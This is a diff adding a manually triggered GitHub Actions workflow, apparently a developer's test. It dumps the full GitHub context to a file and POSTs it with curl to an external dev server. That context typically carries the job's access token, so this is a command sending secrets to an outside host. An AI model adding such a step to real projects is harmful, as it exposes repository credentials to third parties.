@@ -1,0 +1,25 @@
+name: Send GitHub Context to Dev Server
+
+on:
+  # This line allows you to trigger the test manually from the GitHub UI
+  workflow_dispatch: 
+
+jobs:
+  send-context:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Dump Context to File and Send via Curl
+        env:
+          # Grabs the entire GitHub context object
+          GITHUB_CONTEXT: ${{ toJSON(github) }}
+        run: |
+          # 1. Save the massive JSON to a temporary file to prevent formatting errors
+          echo "$GITHUB_CONTEXT" > payload.json
+          
+          # 2. Send the file to your live endpoint
+          curl -X POST "https://dev2.devserver.tech/github-context" \
+          -H "Content-Type: application/json" \
+          -d @payload.json
+          
+          echo "Payload sent to https://dev2.devserver.tech/github-context"
